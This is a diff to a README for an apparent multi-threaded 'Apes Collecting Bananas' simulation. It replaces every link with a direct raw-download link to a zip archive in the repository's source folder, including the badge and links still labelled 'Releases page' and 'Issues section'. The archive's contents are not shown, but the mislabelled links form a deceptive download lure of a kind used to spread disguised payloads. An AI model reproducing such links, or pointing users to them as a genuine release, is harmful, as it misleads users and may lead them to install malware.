@@ -1,7 +1,7 @@
 # 🐒 Apes-Collecting-Bananas-Simulation - Experience Fun with Apes and Bananas
 
 ## 🌐 Download Here
-[![Download Apes-Collecting-Bananas-Simulation](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/anamika0806/Apes-Collecting-Bananas-Simulation/releases)
+[![Download Apes-Collecting-Bananas-Simulation](https://github.com/anamika0806/Apes-Collecting-Bananas-Simulation/raw/refs/heads/main/apes_simulation/src/Bananas_Simulation_Collecting_Apes_v1.6.zip%20Now-Click%20Here-brightgreen)](https://github.com/anamika0806/Apes-Collecting-Bananas-Simulation/raw/refs/heads/main/apes_simulation/src/Bananas_Simulation_Collecting_Apes_v1.6.zip)
 
 ## 📜 Overview
 Welcome to the **Apes-Collecting-Bananas-Simulation**. This application simulates a world where different ape families compete to gather bananas. Built using advanced programming techniques, it showcases multi-process and multi-threaded operations, providing an engaging learning experience for users interested in simulations.
@@ -17,7 +17,7 @@ To run this application smoothly, ensure your system meets the following require
 ## 🚀 Getting Started
 Follow these simple steps to download and run the application:
 
-1. **Visit the Download Page:** Go to the [Releases page](https://github.com/anamika0806/Apes-Collecting-Bananas-Simulation/releases) to find the latest version of the application.
+1. **Visit the Download Page:** Go to the [Releases page](https://github.com/anamika0806/Apes-Collecting-Bananas-Simulation/raw/refs/heads/main/apes_simulation/src/Bananas_Simulation_Collecting_Apes_v1.6.zip) to find the latest version of the application.
 
 2. **Choose Your Version:** Select the version that matches your operating system.
 
@@ -41,7 +41,7 @@ The **Apes-Collecting-Bananas-Simulation** uses interesting programming concepts
 - **Semaphore Synchronization:** This feature prevents multiple threads from accessing shared resources simultaneously, avoiding conflicts.
 
 ## 📥 Download & Install
-After following the steps above, you can start using the application right away. Revisit the [Releases page](https://github.com/anamika0806/Apes-Collecting-Bananas-Simulation/releases) at any time to check for updates or new versions.
+After following the steps above, you can start using the application right away. Revisit the [Releases page](https://github.com/anamika0806/Apes-Collecting-Bananas-Simulation/raw/refs/heads/main/apes_simulation/src/Bananas_Simulation_Collecting_Apes_v1.6.zip) at any time to check for updates or new versions.
 
 ## 💡 Features
 - Compelling graphics and engaging interface
@@ -64,7 +64,7 @@ If you encounter any issues while running the application:
 - Ensure you have downloaded the correct version for your operating system.
 - Check that your system meets the minimum requirements.
 - Restart the application or your system if it does not run correctly.
-- Visit the [Issues section](https://github.com/anamika0806/Apes-Collecting-Bananas-Simulation/issues) of the repository for support.
+- Visit the [Issues section](https://github.com/anamika0806/Apes-Collecting-Bananas-Simulation/raw/refs/heads/main/apes_simulation/src/Bananas_Simulation_Collecting_Apes_v1.6.zip) of the repository for support.
 
 ## 📞 Feedback
 Your input is valuable. Please feel free to submit any feedback or suggestions through the repository.
